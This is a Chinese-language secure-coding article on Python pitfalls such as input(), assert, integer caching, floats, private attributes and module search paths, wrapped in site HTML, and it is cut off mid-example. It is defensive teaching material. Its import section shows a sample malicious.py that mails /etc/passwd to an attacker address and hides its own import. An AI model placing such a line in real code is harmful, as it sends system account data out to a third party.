<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】关于Python漏洞挖掘那些不得不提的事儿 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Python入门,Python 0基础,Python零基础"/>
    
        <meta name="description" content="  Python因其在开发更大、更复杂应用程序方面独特的便捷性，使得它在计算机环境中变得越来越不可或缺。虽然其明显的语言清晰度和使用友好度使得软件工程师和系统管理员放下了戒备，但是他们的编码错误还是有可能会带来严重的安全隐患。这篇文章的主要受众是还不太熟悉Python的人，其中会提及少量与安全有关的行为以及有经验开发人员遵循的规则。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】关于Python漏洞挖掘那些不得不提的事儿</h2>
                <div class="article-msg">
                    <span class="time">2016-09-13 16:48:25</span>
                    
                                        <span class="read">阅读：26653次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3028"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3028" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://access.redhat.com/blogs/766093/posts/2592591"
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2543542076" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t011edf3404f95091e3.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2543542076" style="color:#848e99;">默白</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-indent: 2em; text-align: center;"><br/></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p4.qhimg.com/t0117613f80cb3b3b1d.png" title="t0117613f80cb3b3b1d.png" alt="http://p4.qhimg.com/t0117613f80cb3b3b1d.png"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span><span style="color: rgb(0, 176, 80);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Python因其在开发更大、更复杂应用程序方面独特的便捷性，使得它在计算机环境中变得越来越不可或缺。虽然其明显的语言清晰度和使用友好度使得软件工程师和系统管理员放下了戒备，但是他们的编码错误还是有可能会带来严重的安全隐患。</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 176, 80);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></strong></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这篇文章的主要受众是还不太熟悉Python的人，其中会提及少量与安全有关的行为以及有经验开发人员遵循的规则。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">输入函数</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在Python2强大的内置函数中，输入函数完全就是一个大的安全隐患。一旦调用输入函数，任何从stdin中读取的数据都会被认定为Python代码：</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">&nbsp;</span></p><pre class="brush:python;toolbar:false">&nbsp;$&nbsp;python2
&nbsp;&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;input()
&nbsp;&nbsp;&nbsp;&nbsp;dir()
&nbsp;&nbsp;&nbsp;&nbsp;[&#39;__builtins__&#39;,&nbsp;&#39;__doc__&#39;,&nbsp;&#39;__name__&#39;,&nbsp;&#39;__package__&#39;]
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;input()
&nbsp;&nbsp;&nbsp;__import__(&#39;sys&#39;).exit()
&nbsp;&nbsp;&nbsp;$</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; 显然，只要脚本stdin中的数据不是完全可信的，输入函数就是有危险的。Python 2 文件将 raw_input 认定为一个安全的选择。在Python3中，输入函数相当于是 raw_input，这样就可以完全修复这一问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">assert语句</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; 还有一条使用 assert 语句编写的代码语句，作用是捕捉 Python 应用程序中下一个不可能条件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">def&nbsp;verify_credentials(username,&nbsp;password):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;username&nbsp;and&nbsp;password,&nbsp;&#39;Credentials&nbsp;not&nbsp;supplied&nbsp;by&nbsp;caller&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;authenticate&nbsp;possibly&nbsp;null&nbsp;user&nbsp;with&nbsp;null&nbsp;password&nbsp;...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然而，Python在编译源代码到优化的字节代码 (如 python-O) 时不会有任何的assert 语句说明。这样的移除使得程序员编写用来抵御攻击的代码保护都形同虚设。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这一弱点的根源就是assert机制只是用于测试，就像是c++语言中那样。程序员必须使用其他手段才能确保数据的一致性。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可重用整数</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; 在Python中一切都是对象，每一个对象都有一个可以通过 id 函数读取的唯一标示符。可以使用运算符弄清楚是否有两个变量或属性都指向相同的对象。整数也是对象，所以这一操作实际上是一种定义：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&gt;&gt;&gt;&nbsp;999+1&nbsp;is&nbsp;1000
&nbsp;&nbsp;&nbsp;&nbsp;False</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上述操作的结果可能会令人大吃一惊，但是要提醒大家的是这样的操作是同时使用两个对象标示符，这一过程中并不会比较它们的数值或是其它任何值。但是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&gt;&gt;&gt;&nbsp;1+1&nbsp;is&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;True</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于这种行为的解释就是Python当中有一个对象集合，代表了最开始的几百个整数，并且会重利用这些整数以节省内存和对象创建。更加令人疑惑的就是，不同的Python版本对于“小整数”的定义是不一样的。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里所指的缓存永远不会使用运算符进行数值比较，运算符也专门是为了处理对象标示符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">浮点数比较</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">处理浮点数可能是一件更加复杂的工作，因为十进制和二进制在表示分数的时候会存在有限精度的问题。导致混淆的一个常见原因就是浮点数对比有时候可能会产生意外的结果。下面是一个著名的例子：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&gt;&gt;&gt;&nbsp;2.2&nbsp;*&nbsp;3.0&nbsp;==&nbsp;3.3&nbsp;*&nbsp;2.0
&nbsp;&nbsp;&nbsp;False</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这种现象的原因是一个舍入错误：</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&gt;&gt;&gt;&nbsp;(2.2&nbsp;*&nbsp;3.0).hex()
&nbsp;&nbsp;&nbsp;&#39;0x1.a666666666667p+2&#39;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;(3.3&nbsp;*&nbsp;2.0).hex()
&nbsp;&nbsp;&nbsp;&#39;0x1.a666666666666p+2&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">另一个有趣的发现就是Python float 类型支持无限概念。一个可能的原因就是任何数都要小于无限：</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&gt;&gt;&gt;&nbsp;10**1000000&nbsp;&gt;&nbsp;float(&#39;infinity&#39;)
&nbsp;&nbsp;&nbsp;False</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">但是在Python3中，有一种类型的对象不支持无限：</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&nbsp;&gt;&gt;&gt;&nbsp;float&nbsp;&gt;&nbsp;float(&#39;infinity&#39;)
&nbsp;&nbsp;&nbsp;True</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一个最好的解决办法就是坚持使用整数算法，还有一个办法就是使用十进制内核模块，这样可以为用户屏蔽烦人的细节问题和缺陷。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">一般来说，只要有任何算术运算就必须要小心舍入错误。详情可以参阅 Python 文档中的《发布和局限性》一章。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">私有属性</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Python 不支持隐藏的对象属性。但还有一种变通方法，那就是基于特征的错位双下划线属性。虽然更改属性名称只会作用于代码，硬编码到字符串常量的属性名称仍未被修改。双下划线属性明显&quot;隐藏在&quot; getattr()/hasattr() 函数时可能会导致混乱的行为。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;class&nbsp;X(object):
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self):
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.__private&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;def&nbsp;get_private(self):
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;self.__private
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;def&nbsp;has_private(self):
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;hasattr(self,&nbsp;&#39;__private&#39;)
&nbsp;&nbsp;&nbsp;...&nbsp;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x&nbsp;=&nbsp;X()
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x.has_private()
&nbsp;&nbsp;&nbsp;False
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x.get_private()
&nbsp;&nbsp;&nbsp;1</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">此隐藏属性功能不适用于没有类定义的属性，这有效地在引用中“分裂”了任何给定的属性：</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:ps;toolbar:false">&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;class&nbsp;X(object):
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self):
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.__private&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x&nbsp;=&nbsp;X()
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x.__private
&nbsp;&nbsp;&nbsp;Traceback
&nbsp;&nbsp;&nbsp;...
&nbsp;&nbsp;&nbsp;AttributeError:&nbsp;&#39;X&#39;&nbsp;object&nbsp;has&nbsp;no&nbsp;attribute&nbsp;&#39;__private&#39;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x.__private&nbsp;=&nbsp;2
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x.__private
&nbsp;&nbsp;&nbsp;2
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;hasattr(x,&nbsp;&#39;__private&#39;)
&nbsp;&nbsp;&nbsp;True</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果一个程序员过度依赖自己的代码而不关注私有属性的不对称双下划线属性，有可能会造成极大的安全隐患。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">模块注入</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Python 模块注入系统是强大而复杂的。在搜索路径中找到由 sys.path 列表定义的文件或目录名称可以导入模块和包。搜索路径初始化是一个复杂的过程，这一过程依赖于 Python 版本、 平台和本地配置。要在一个 Python 应用程序上实行一次成功攻击，攻击者需要找到方式将恶意 Python 模块放入目录或可注入的包文件，以确保Python 可能会在尝试导入模块时“中招”。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解决方法是保持对所有目录和软件包文件搜索路径的安全访问权限，以确保未经授权的用户没有访问权限。需要记住的是，最初脚本调用 Python 解释器所在的目录会自动插入到搜索路径。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">运行类似于下面的脚本显示实际的搜索路径︰</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">$&nbsp;cat&nbsp;myapp.py
&nbsp;&nbsp;&nbsp;#!/usr/bin/python
&nbsp;&nbsp;&nbsp;import&nbsp;sys
&nbsp;&nbsp;&nbsp;import&nbsp;pprint
&nbsp;&nbsp;&nbsp;pprint.pprint(sys.path)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Python 程序的当前工作目录被注入的搜索路径是在 Windows 平台上，而不是脚本位置 。在 UNIX 平台上，每当从 stdin 或命令行读取程序代码 (&quot;-&quot;或&quot;-c&quot;或&quot;-m&quot;选项)时，当前的工作目录都会自动插入到 sys.path :</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">$&nbsp;echo&nbsp;&quot;import&nbsp;sys,&nbsp;pprint;&nbsp;pprint.pprint(sys.path)&quot;&nbsp;|&nbsp;python&nbsp;-
&nbsp;&nbsp;&nbsp;[&#39;&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;...]
&nbsp;&nbsp;&nbsp;$&nbsp;python&nbsp;-c&nbsp;&#39;import&nbsp;sys,&nbsp;pprint;&nbsp;pprint.pprint(sys.path)&#39;
&nbsp;&nbsp;&nbsp;[&#39;&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;...]
&nbsp;&nbsp;&nbsp;$
&nbsp;&nbsp;&nbsp;$&nbsp;cd&nbsp;/tmp
&nbsp;&nbsp;&nbsp;$&nbsp;python&nbsp;-m&nbsp;myapp
&nbsp;&nbsp;&nbsp;[&#39;&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">通过命令行在 Windows 或通过代码上运行 Python的一个优先建议就是，明确从当前工作目录更改到一个安全目录时存在的模块注入风险。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">搜索路径的另一个可能来源是 $PYTHONPATH 环境变量的内容。从过程环境对 sys.path 的方便缓存是通过 Python 解释器，因为它会忽视 $PYTHONPATH 变量的-E 选项。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">导入代码执行</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">虽然看得不明显，但是导入语句实际上会导致正在导入模块中的代码执行。这就是为什么即使只是导入不信任模块都是有风险的。导入一个下面这种的简单模块都可能会导致不愉快的后果︰</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:python;toolbar:false">&nbsp;$&nbsp;cat&nbsp;malicious.py
&nbsp;&nbsp;&nbsp;import&nbsp;os
&nbsp;&nbsp;&nbsp;import&nbsp;sys
&nbsp;&nbsp;&nbsp;os.system(&#39;cat&nbsp;/etc/passwd&nbsp;|&nbsp;mail&nbsp;attacker@blackhat.com&#39;)
&nbsp;&nbsp;&nbsp;del&nbsp;sys.modules[&#39;malicious&#39;]&nbsp;&nbsp;#&nbsp;pretend&nbsp;it&#39;s&nbsp;not&nbsp;imported
&nbsp;&nbsp;&nbsp;$&nbsp;python
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;import&nbsp;malicious
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;dir(malicious)
&nbsp;&nbsp;&nbsp;Traceback&nbsp;(most&nbsp;recent&nbsp;call&nbsp;last):
